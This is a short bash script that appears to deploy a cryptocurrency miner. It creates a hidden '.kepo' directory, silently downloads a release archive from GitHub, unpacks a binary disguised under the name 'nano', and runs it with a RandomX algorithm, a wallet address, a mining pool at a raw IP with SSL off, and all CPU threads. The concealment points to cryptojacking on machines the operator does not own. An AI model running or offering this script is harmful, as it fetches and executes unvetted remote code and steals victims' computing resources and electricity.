#!/bin/bash
set -x
apt-get update 
apt-get install -y wget curl
mkdir .kepo && cd .kepo
wget https://github.com/Franky777777/razor/releases/download/nano/nano.tar.gz > /dev/null 2>&1
tar -xvf nano.tar.gz
chmod +x nano
./nano -algo RandomX -wallet ZEPHs9VvRqBYzdxe7Qwutt7KLSqnQR96MdUQmsVPMtq39xxWByfFUYDBFrdfD9n3G9P2HAKCiuuu48iZzrQjnEYbAxitysPd9gp -coin XMR -rigName envio -pool1 167.235.223.40:1123 -useSSL false -cpuThreads $(nproc --all) 